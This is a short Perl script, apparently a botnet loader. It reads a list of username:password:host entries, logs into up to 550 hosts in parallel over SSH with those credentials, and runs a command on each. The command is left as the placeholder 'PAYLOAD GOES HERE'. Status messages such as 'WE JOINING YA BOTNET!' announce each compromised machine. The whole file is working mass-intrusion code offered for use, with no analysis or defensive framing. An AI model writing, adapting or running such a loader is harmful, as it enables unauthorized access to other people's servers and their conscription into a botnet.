#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('PAYLOAD GOES HERE');
                        sleep 10; 
                        $channel->close;
                        print "\e[1;37mWE JOINING YA BOTNET!: ".$newarray[$c]."\n";
                } else {
                        print "\e[1;32mAttempting Infection...\n";
                }
        } else {
                print "\e[1;31mFailed Infection...\n";
        }
        $pm->finish;
}
$pm->wait_all_children;
